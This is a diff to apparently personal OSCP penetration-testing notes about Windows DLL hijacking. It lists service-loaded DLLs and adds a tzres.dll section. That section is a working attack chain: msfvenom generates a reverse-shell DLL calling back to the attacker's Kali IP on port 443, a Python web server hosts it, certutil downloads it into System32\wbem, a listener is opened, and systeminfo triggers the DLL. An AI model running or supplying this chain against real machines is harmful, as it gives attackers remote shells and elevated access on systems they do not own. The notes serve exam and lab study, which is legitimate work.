@@ -31,9 +31,13 @@ C:\Windows\System32\wlbsctrl.dll (IKEEXT service) C:\Windows\System32\wbem\wbemc
 ================================================================C:\Windows\System32\ualapi.dll (spooler service) http://www.hexacorn.com/blog/2016/11/08/beyond-good-ol-run-key-part-50/ ================================================================C:\Windows\System32\fveapi.dll (ShellHWDetection Service) @bohops ================================================================C:\Windows\System32\Wow64Log.dll (this dll loaded by other third party services such as GoogleUpdate.exe)
 ```
 
+---
+
+## Tzres.dll
+
 ```powershell
 #tzres.dll  
-`C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)`
+C:\Windows\System32\wbem\tzres.dll (systeminfo, NetworkService)
 ```
 
 Windows x64 TCP Reverse shell EXE | PORT 443| tzres.dll
@@ -43,4 +47,24 @@ const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page
 const command = `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${KaliIP} LPORT=443 -f dll > tzres.dll`;
 
 dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+python -m http.server 80
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/tzres.dll C:\\\Windows\\\System32\\\wbem\\tzres.dll`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+---
+
+Open listener
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 443 -O / --oscp-safe
+```
+
+```
+systeminfo
 ```
